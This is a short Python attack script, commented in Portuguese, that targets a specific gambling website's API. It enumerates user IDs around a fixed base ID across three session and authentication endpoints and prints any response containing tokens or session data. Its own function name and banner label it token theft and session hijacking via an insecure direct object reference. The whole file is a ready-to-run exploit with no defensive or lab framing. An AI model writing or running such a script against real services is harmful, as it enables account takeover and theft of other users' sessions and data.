import requests
import json

API_BASE = "https://vipvip.vip999jogo.com"
BASE_ID = 211995351

def steal_tokens():
    print("[*] Iniciando Sequestro de Sessão via IDOR...")
    # Endpoints que podem retornar tokens ou identificadores de sessão
    endpoints = [
        "/hall/api/gohal/get_session",
        "/hall/api/gohal/auth_status",
        "/hall/api/gohal/user_meta"
    ]
    
    for i in range(-20, 21):
        target_id = BASE_ID + i
        for ep in endpoints:
            url = f"{API_BASE}{ep}?id={target_id}"
            try:
                res = requests.get(url, timeout=3)
                if res.status_code == 200 and ("token" in res.text.lower() or "session" in res.text.lower()):
                    print(f"[!!!] TOKEN/SESSÃO EXPOSTA: {url}")
                    print(f"    Dados: {res.text}")
            except:
                continue

if __name__ == "__main__":
    steal_tokens()
